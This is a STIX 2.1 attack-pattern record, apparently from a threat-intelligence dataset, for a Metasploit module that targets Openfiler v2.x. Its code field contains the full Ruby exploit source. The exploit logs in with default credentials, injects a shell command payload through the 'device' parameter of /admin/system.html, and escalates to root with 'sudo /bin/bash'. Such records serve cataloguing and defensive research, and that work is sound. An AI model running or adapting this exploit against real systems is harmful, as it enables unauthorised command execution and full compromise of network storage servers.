{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9cbff79d-2d4c-44d8-9fe1-401376d10ba7",
    "created": "2024-08-14T17:03:44.320796Z",
    "modified": "2024-08-14T17:03:44.3208Z",
    "name": "\"Openfiler v2.x NetworkCard Command Execution\"",
    "description": " This module exploits a vulnerability in Openfiler v2.x which could be abused to allow authenticated users to execute arbitrary code under the context of the 'openfiler' user. The 'system.html' file uses user controlled data from the 'device' parameter to create a new 'NetworkCard' object. The class constructor in 'network.inc' calls exec() with the supplied data. The 'openfiler' user may 'sudo /bin/bash' without providing a system password.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/openfiler_networkcard_exec.rb",
            "external_id": "openfiler_networkcard_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://itsecuritysolutions.org/2012-09-06-Openfiler-v2.x-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Openfiler v2.x NetworkCard Command Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability in Openfiler v2.x\n        which could be abused to allow authenticated users to execute arbitrary\n        code under the context of the 'openfiler' user. The 'system.html' file\n        uses user controlled data from the 'device' parameter to create a new\n        'NetworkCard' object. The class constructor in 'network.inc' calls exec()\n        with the supplied data. The 'openfiler' user may 'sudo /bin/bash' without\n        providing a system password.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bcoles' # Discovery and exploit\n        ],\n      'References'     =>\n        [\n          ['BID', '55490'],\n          ['URL', 'http://itsecuritysolutions.org/2012-09-06-Openfiler-v2.x-multiple-vulnerabilities/'],\n          ['OSVDB', '93881'],\n          ['EDB',   '21191']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet python perl',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-09-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(446),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('USERNAME', [true, 'The username for the application', 'openfiler']),\n        OptString.new('PASSWORD', [true, 'The password for the application', 'password'])\n      ])\n  end\n\n  def check\n    # retrieve software version from login page\n    vprint_status(\"Sending check\")\n    begin\n      res = send_request_cgi({\n        'uri' => '/'\n      })\n\n      if    res and res.code == 200 and res.body =~ /<strong>Distro Release:&nbsp;<\\/strong>Openfiler [NE]SA 2\\./\n        return Exploit::CheckCode::Appears\n      elsif res and res.code == 200 and res.body =~ /<title>Openfiler Storage Control Center<\\/title>/\n        return Exploit::CheckCode::Detected\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def on_new_session(client)\n    client.shell_command_token(\"sudo /bin/bash\")\n  end\n\n\n  def exploit\n    user  = datastore['USERNAME']\n    pass  = datastore['PASSWORD']\n    cmd   = Rex::Text.uri_encode(\"&#{payload.raw}&\")\n\n    # send payload\n    print_status(\"Sending payload (#{payload.raw.length} bytes)\")\n    begin\n      res = send_request_cgi({\n        'uri'       => '/admin/system.html',\n        'cookie'    => \"usercookie=#{user}; passcookie=#{pass};\",\n        'encode_params' => false,\n        'vars_get'  => {\n          'step'    => '2',\n          'device'  => \"lo#{cmd}\"\n        }\n      }, 25)\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unknown, 'Connection failed')\n    end\n\n    if    res and res.code == 200 and res.body =~ /<title>System : Network Setup<\\/title>/\n      print_good(\"Payload sent successfully\")\n    elsif res and res.code == 302 and res.headers['Location'] =~ /\\/index\\.html\\?redirect/\n      fail_with(Failure::NoAccess, 'Authentication failed')\n    else\n      fail_with(Failure::Unknown, 'Sending payload failed')\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}